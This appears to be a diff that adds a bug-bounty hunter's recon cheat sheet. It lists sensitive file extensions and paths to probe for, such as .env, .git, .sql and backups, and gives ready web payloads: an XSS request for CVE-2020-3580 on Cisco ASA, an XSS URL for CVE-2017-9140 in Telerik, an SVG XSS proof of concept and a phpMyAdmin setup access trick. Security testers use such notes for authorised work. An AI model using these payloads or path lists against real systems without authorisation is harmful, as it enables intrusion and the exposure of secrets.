@@ -1,0 +1,97 @@
+.zip
+.bkp.zip
+.tar.bz2
+.txt
+.log
+.cache
+.secret
+.db
+.sql
+.md5
+.backup
+.yml
+.json
+.gz
+.rar
+.config
+.git
+.env
+.env.example
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+.do
+.action
+
+
+I wonder why some sys-admins configure the server with sudo privileges! 🤔
+Tip: Always test for Expression Language Injection like OGNL when you see *.do and *.action file extensions.
+
+https://twitter.com/win3zz/status/1594273626655948800
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+>> 𝗖𝗩𝗘-𝟮𝟬𝟮𝟬-𝟯𝟱𝟴𝟬 ⚠️🚀
+Which is an Unauthenticated POST-based XSS at Cisco Adaptive Security Appliance!
+
+POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
+Host: example.tld
+SAMLResponse="><svg/onload=alert('Hacked')>
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+.axd
+
+Xss Due To CVE-2017-9140 
+https://Target/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
+
+https://twitter.com/IsrewyMohand/status/1633128561467965440
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+/phpmyadmin
+
+If found go to  --->     /phpmyadmin/setup/
+
+target[.]com/phpmyadmin/setup/index.php
+==> 301 to login page
+
+target[.]com/phpMyAdmin/setup/index.php
+==> 200 to phpmyadmin setup
+
+phpmyadmin 301
+phpMyAdmin 200
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+image?url=
+
+XSS via SVG
+
+PoC: https://i.embed.ly/1/image?url=https://bughuntar.github.io/poc/xss.svg&key=bb604e7974304bcc890165e12e2e0a7b
+
+
+https://twitter.com/bughuntar/status/1582729316458434561
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+
+
+log.jsp
+dashboard
+admin
+aws
+config
+token
+oauth
+api
+access
+auth
+internal
+
+
+
+
+
+/files.md5
+/db/sqlsrv/full.sql
